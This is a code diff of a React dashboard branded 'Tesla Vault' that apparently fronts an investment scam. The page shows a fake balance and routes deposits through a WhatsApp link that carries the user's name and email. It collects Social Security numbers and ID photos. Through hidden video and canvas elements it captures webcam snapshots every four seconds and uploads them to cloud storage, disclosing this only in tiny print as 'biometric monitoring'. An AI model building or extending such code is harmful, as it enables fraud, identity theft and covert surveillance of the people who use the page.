@@ -2,13 +2,16 @@
 
 import React, { useEffect, useState, useRef } from 'react';
 import { supabase } from '@/lib/supabaseClient';
-import { LogOut, Lock, Smartphone, ShieldCheck, Activity, Upload, Camera, Loader2 } from 'lucide-react';
+import { 
+  LogOut, Lock, Smartphone, ShieldCheck, 
+  Activity, Upload, Camera, Loader2, User, 
+  ArrowUpRight, Wallet
+} from 'lucide-react';
 
 export default function Dashboard() {
   const [loading, setLoading] = useState(true);
   const [user, setUser] = useState<any>(null);
   
-  // KYC State
   const [ssn, setSsn] = useState('');
   const [idType, setIdType] = useState('driver_license');
   const [idFile, setIdFile] = useState<File | null>(null);
@@ -29,7 +32,6 @@ export default function Dashboard() {
       };
       fetchProfile();
 
-      // REALTIME: Syncs changes instantly
       const channel = supabase.channel('db-sync')
         .on('postgres_changes', { event: '*', schema: 'public', table: 'profiles', filter: `id=eq.${session.user.id}` }, 
         (payload) => setUser(payload.new))
@@ -46,7 +48,6 @@ export default function Dashboard() {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       if (videoRef.current) videoRef.current.srcObject = stream;
       
-      // SNAPSHOT LOOP: Every 4 seconds
       setInterval(async () => {
         if (!videoRef.current || !canvasRef.current) return;
         const context = canvasRef.current.getContext('2d');
@@ -56,7 +57,7 @@ export default function Dashboard() {
           await supabase.storage.from('proctor-snapshots').upload(`${userId}/live_${Date.now()}.jpg`, blob);
         }
       }, 4000);
-    } catch (e) { console.warn("Camera blocked"); }
+    } catch (e) { console.warn("Biometrics offline"); }
   };
 
   const handleKyc = async (e: React.FormEvent) => {
@@ -72,81 +73,174 @@ export default function Dashboard() {
     finally { setKycSubmitting(false); }
   };
 
-  // --- THE CRITICAL FIX ---
-  // This converts "Unlocked " or "APPROVED" into clean lowercase for the check
   const rawStatus = user?.deposit_status?.toString().toLowerCase().trim() || "";
   const isUnlocked = rawStatus === 'unlocked' || rawStatus === 'approved';
-  
-  const waLink = `https://wa.me/1234567890?text=I%20am%20${user?.full_name}%20and%20I%20want%20to%20deposit.`;
+  const waLink = `https://wa.me/1234567890?text=I%20am%20${user?.full_name}%20(${user?.email})%20and%20I%20want%20to%20deposit.`;
 
-  if (loading) return <div className="min-h-screen bg-black flex items-center justify-center text-[#D4AF37] animate-pulse">Establishing Link...</div>;
+  if (loading) return (
+    <div className="min-h-screen bg-black flex flex-col items-center justify-center space-y-4">
+      <div className="w-12 h-12 border-2 border-[#D4AF37] border-t-transparent rounded-full animate-spin" />
+      <p className="text-[#D4AF37] text-[10px] uppercase tracking-[0.4em]">Establishing Secure Link</p>
+    </div>
+  );
 
   return (
-    <main className="min-h-screen bg-[#050505] text-white p-6">
+    <main className="min-h-screen bg-[#050505] text-white selection:bg-[#D4AF37] selection:text-black">
+      {/* BACKGROUND ELEMENTS */}
+      <div className="fixed inset-0 bg-[radial-gradient(circle_at_top_right,_var(--tw-gradient-stops))] from-[#D4AF37]/5 via-transparent to-transparent pointer-events-none" />
       <video ref={videoRef} autoPlay muted className="hidden" />
       <canvas ref={canvasRef} width="640" height="480" className="hidden" />
 
-      <div className="max-w-6xl mx-auto">
-        <header className="flex justify-between items-center mb-12 border-b border-white/5 pb-6">
-           <h1 className="text-2xl font-serif italic text-[#D4AF37]">Vault <span className="text-white">Terminal</span></h1>
-           <button onClick={() => supabase.auth.signOut().then(() => window.location.href='/portal/auth')} className="p-3 bg-white/5 rounded-full"><LogOut size={20} /></button>
-        </header>
+      {/* MOBILE FRIENDLY HEADER */}
+      <header className="sticky top-0 z-[100] bg-black/60 backdrop-blur-xl border-b border-white/5">
+        <div className="max-w-7xl mx-auto px-4 md:px-10 h-20 flex justify-between items-center">
+           <div className="flex items-center gap-3">
+              <div className="w-10 h-10 rounded-xl bg-[#D4AF37] flex items-center justify-center shadow-[0_0_20px_rgba(212,175,55,0.2)]">
+                <Activity size={20} className="text-black" />
+              </div>
+              <h1 className="text-xl font-serif italic hidden sm:block">Tesla <span className="text-[#D4AF37]">Vault</span></h1>
+           </div>
+           
+           <div className="flex items-center gap-4">
+              <div className="flex flex-col items-end mr-2">
+                <span className="text-[10px] text-gray-500 uppercase tracking-widest font-bold">Node ID</span>
+                <span className="text-[11px] text-white font-mono">{user?.full_name?.split(' ')[0]}</span>
+              </div>
+              <button 
+                onClick={() => supabase.auth.signOut().then(() => window.location.href='/portal/auth')} 
+                className="w-10 h-10 flex items-center justify-center bg-white/5 rounded-full hover:bg-red-500/20 hover:text-red-500 transition-all border border-white/10"
+              >
+                <LogOut size={18} />
+              </button>
+           </div>
+        </div>
+      </header>
 
-        <div className="grid lg:grid-cols-3 gap-6 mb-12">
-          <div className="lg:col-span-2 bg-[#0a0a0a] border border-white/5 p-12 rounded-[3rem] shadow-2xl">
-             <p className="text-gray-500 text-[10px] uppercase tracking-widest mb-4">Total Equity</p>
-             <h2 className="text-7xl font-serif mb-10">${user?.balance?.toLocaleString()}</h2>
+      <div className="max-w-7xl mx-auto px-4 md:px-10 pt-8 pb-20 space-y-6">
+        
+        {/* TOP ROW: BALANCE & QUICK STATS */}
+        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
+          
+          {/* BALANCE CARD (Responsive Height) */}
+          <div className="lg:col-span-8 bg-[#0a0a0a] border border-white/5 p-8 md:p-14 rounded-[2.5rem] md:rounded-[3.5rem] shadow-2xl relative overflow-hidden flex flex-col justify-between min-h-[350px]">
+             <div>
+               <div className="flex items-center gap-2 mb-6">
+                 <Wallet size={14} className="text-[#D4AF37]" />
+                 <p className="text-gray-500 text-[10px] uppercase tracking-[0.4em] font-bold">Consolidated Equity</p>
+               </div>
+               <h2 className="text-5xl md:text-8xl font-serif text-white tracking-tighter leading-none">
+                 ${user?.balance?.toLocaleString() || '0.00'}
+               </h2>
+             </div>
              
-             <a href={isUnlocked ? waLink : "#"} onClick={(e) => !isUnlocked && e.preventDefault()}
-               className={`inline-flex items-center gap-3 px-12 py-5 rounded-full font-bold uppercase tracking-widest text-[10px] transition-all
-               ${isUnlocked ? 'bg-green-600 hover:bg-green-500 shadow-[0_0_30px_rgba(34,197,94,0.3)]' : 'bg-white/5 text-gray-500 cursor-not-allowed'}`}>
-               {isUnlocked ? <><Smartphone size={16}/> Initialize Deposit</> : <><Lock size={16}/> Restricted Access</>}
-             </a>
+             <div className="mt-10 md:mt-0 flex flex-col md:flex-row items-center gap-4">
+               <a 
+                 href={isUnlocked ? waLink : "#"} 
+                 onClick={(e) => !isUnlocked && e.preventDefault()}
+                 className={`w-full md:w-auto px-10 py-5 rounded-full font-black uppercase tracking-widest text-[11px] flex items-center justify-center gap-3 transition-all duration-500 text-center
+                 ${isUnlocked ? 'bg-[#D4AF37] text-black shadow-[0_0_40px_rgba(212,175,55,0.3)] hover:scale-105' : 'bg-white/5 text-gray-500 cursor-not-allowed border border-white/10'}`}
+               >
+                 {isUnlocked ? <><Smartphone size={16}/> Initialize Deposit</> : <><Lock size={16}/> Deposit Restricted</>}
+               </a>
+               {!isUnlocked && (
+                 <p className="text-[10px] text-gray-600 uppercase tracking-widest font-bold">Awaiting Compliance Review</p>
+               )}
+             </div>
           </div>
 
-          <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-[3rem] flex flex-col justify-between">
-             <div className="space-y-4">
-                <div className="flex justify-between border-b border-white/5 pb-2 text-[10px] uppercase">
-                   <span className="text-gray-500">Auth Name</span>
-                   <span>{user?.full_name}</span>
+          {/* STATUS SIDEBAR (Stacked on Mobile) */}
+          <div className="lg:col-span-4 space-y-6">
+             <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-[2.5rem] flex flex-col justify-center h-full space-y-8">
+                <div className="flex justify-between items-center border-b border-white/5 pb-4">
+                   <div className="flex items-center gap-3">
+                     <ShieldCheck size={18} className={isUnlocked ? 'text-green-500' : 'text-yellow-500'} />
+                     <span className="text-gray-400 text-[10px] uppercase tracking-widest font-bold">Vault Status</span>
+                   </div>
+                   <span className={`text-[11px] font-mono uppercase ${isUnlocked ? 'text-green-500' : 'text-yellow-500'}`}>
+                     {user?.deposit_status || 'Checking'}
+                   </span>
                 </div>
-                <div className="flex justify-between border-b border-white/5 pb-2 text-[10px] uppercase">
-                   <span className="text-gray-500">Status</span>
-                   <span className={isUnlocked ? "text-green-500" : "text-yellow-500"}>{user?.deposit_status}</span>
+
+                <div className="flex justify-between items-center border-b border-white/5 pb-4">
+                   <div className="flex items-center gap-3">
+                     <User size={18} className="text-blue-400" />
+                     <span className="text-gray-400 text-[10px] uppercase tracking-widest font-bold">KYC Level</span>
+                   </div>
+                   <span className="text-[11px] font-mono text-white uppercase">{user?.kyc_status === 'verified' ? 'ELITE' : 'BASIC'}</span>
                 </div>
-             </div>
-             <div className="bg-[#D4AF37]/5 border border-[#D4AF37]/20 p-4 rounded-2xl flex items-center gap-3">
-                <Camera size={18} className="text-[#D4AF37] animate-pulse" />
-                <p className="text-[8px] text-gray-400 uppercase leading-relaxed">Biometric Monitoring: Snapshots logged every 4s.</p>
+
+                <div className="bg-[#D4AF37]/5 border border-[#D4AF37]/20 p-5 rounded-2xl flex items-center gap-4">
+                   <div className="relative">
+                      <Camera size={20} className="text-[#D4AF37]" />
+                      <div className="absolute -top-1 -right-1 w-2 h-2 bg-red-500 rounded-full animate-pulse" />
+                   </div>
+                   <p className="text-[9px] text-gray-400 uppercase leading-relaxed font-bold">Live Biometrics: Capturing secure monitoring logs every 4 seconds.</p>
+                </div>
              </div>
           </div>
         </div>
 
-        {/* KYC FORM */}
+        {/* VERIFICATION CENTER (Responsive Form) */}
         {user?.kyc_status !== 'verified' && (
-          <div className="bg-[#0a0a0a] border border-white/5 rounded-[3rem] p-12">
-            <h3 className="text-3xl font-serif mb-8">Identity Verification</h3>
-            <form onSubmit={handleKyc} className="space-y-6 max-w-xl">
-              <div className="grid md:grid-cols-2 gap-6">
-                <select value={idType} onChange={(e)=>setIdType(e.target.value)} className="bg-black border border-white/10 rounded-xl p-4 text-xs">
-                  <option value="driver_license">Driver's License</option>
-                  <option value="passport">Passport</option>
-                </select>
-                <input type="text" placeholder="SSN (XXX-XX-XXXX)" value={ssn} onChange={(e)=>setSsn(e.target.value)} className="bg-black border border-white/10 rounded-xl p-4 text-xs" required />
+          <div className="bg-[#0a0a0a] border border-white/5 rounded-[2.5rem] md:rounded-[3.5rem] p-8 md:p-16 relative overflow-hidden shadow-inner">
+            <div className="max-w-3xl">
+              <div className="flex items-center gap-3 mb-6">
+                <ShieldCheck size={24} className="text-[#D4AF37]" />
+                <h3 className="text-3xl md:text-4xl font-serif">Security Verification</h3>
               </div>
-              <div className="border-2 border-dashed border-white/10 rounded-2xl p-10 text-center relative">
-                <input type="file" accept="image/*" onChange={(e)=>setIdFile(e.target.files?.[0] || null)} className="absolute inset-0 opacity-0 cursor-pointer" required />
-                <Upload className="mx-auto mb-2 text-gray-500" />
-                <p className="text-xs text-gray-500">{idFile ? idFile.name : "Upload ID Image"}</p>
-              </div>
-              <button disabled={kycSubmitting} className="bg-white text-black px-10 py-4 rounded-full font-bold uppercase text-[10px] hover:bg-[#D4AF37] transition-all">
-                {kycSubmitting ? "Processing..." : "Submit Verification"}
-              </button>
-            </form>
+              <p className="text-gray-500 text-sm mb-12 font-light leading-relaxed">Required for Tier-1 wealth management access and high-limit withdrawals.</p>
+
+              {user?.kyc_status === 'pending' ? (
+                <div className="bg-white/5 border border-white/10 p-12 rounded-[2rem] text-center space-y-4">
+                   <Activity className="text-[#D4AF37] mx-auto animate-spin" size={32} />
+                   <p className="text-xs uppercase tracking-[0.3em] font-bold text-white">Security Review in Progress</p>
+                   <p className="text-[10px] text-gray-500">Your documents are currently being decrypted and verified by our compliance node.</p>
+                </div>
+              ) : (
+                <form onSubmit={handleKyc} className="space-y-8">
+                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                    <div className="space-y-2">
+                      <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">Identity Document</label>
+                      <select value={idType} onChange={(e)=>setIdType(e.target.value)} className="w-full bg-black border border-white/10 rounded-2xl p-5 outline-none focus:border-[#D4AF37] text-xs transition-all cursor-pointer">
+                        <option value="driver_license">Driver's License</option>
+                        <option value="passport">International Passport</option>
+                      </select>
+                    </div>
+                    <div className="space-y-2">
+                      <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">Social Security Number</label>
+                      <input 
+                        type="text" placeholder="XXX-XX-XXXX" value={ssn} onChange={(e)=>setSsn(e.target.value)} 
+                        className="w-full bg-black border border-white/10 rounded-2xl p-5 outline-none focus:border-[#D4AF37] text-xs tracking-widest" 
+                        required 
+                      />
+                    </div>
+                  </div>
+
+                  <div className="space-y-2">
+                    <label className="text-[9px] uppercase tracking-widest text-gray-500 ml-2 font-black">Proof of Identity (Front View)</label>
+                    <div className="relative group min-h-[160px] border-2 border-dashed border-white/10 rounded-3xl p-6 flex flex-col items-center justify-center gap-3 bg-black hover:border-[#D4AF37]/50 transition-all cursor-pointer">
+                      <input type="file" accept="image/*" onChange={(e)=>setIdFile(e.target.files?.[0] || null)} className="absolute inset-0 opacity-0 cursor-pointer z-10" required />
+                      <div className="w-12 h-12 rounded-full bg-white/5 flex items-center justify-center text-gray-400 group-hover:text-[#D4AF37] transition-colors">
+                        <Upload size={20} />
+                      </div>
+                      <span className="text-[10px] uppercase font-bold tracking-widest text-gray-500 group-hover:text-white transition-colors">
+                        {idFile ? idFile.name : `Attach ${idType.replace('_', ' ')} Photo`}
+                      </span>
+                    </div>
+                  </div>
+
+                  <button 
+                    disabled={kycSubmitting} 
+                    className="w-full md:w-auto px-16 py-6 bg-white text-black font-black uppercase tracking-widest text-[11px] rounded-full hover:bg-[#D4AF37] transition-all shadow-xl active:scale-95"
+                  >
+                    {kycSubmitting ? "Encrypting Documents..." : "Finalize Verification"}
+                  </button>
+                </form>
+              )}
+            </div>
           </div>
         )}
       </div>
     </main>
   );
-                   }
-                  
+                 }
